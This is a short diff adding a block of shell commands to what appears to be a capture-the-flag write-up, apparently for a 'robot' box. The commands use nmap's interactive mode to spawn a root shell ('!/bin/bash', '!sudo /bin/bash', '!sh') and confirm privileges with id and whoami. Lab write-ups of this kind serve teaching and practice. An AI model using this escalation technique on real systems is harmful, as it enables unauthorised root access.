@@ -76,6 +76,22 @@ su robot
 
 ~~~
 
+~~~
+
+which nmap
+nmap --version
+export TERM=xterm
+nmap --interactive
+!/bin/bash
+id
+whoami
+exit
+!sudo /bin/bash
+!id
+!whoami
+!sh
+
+~~~
 
 
 ---
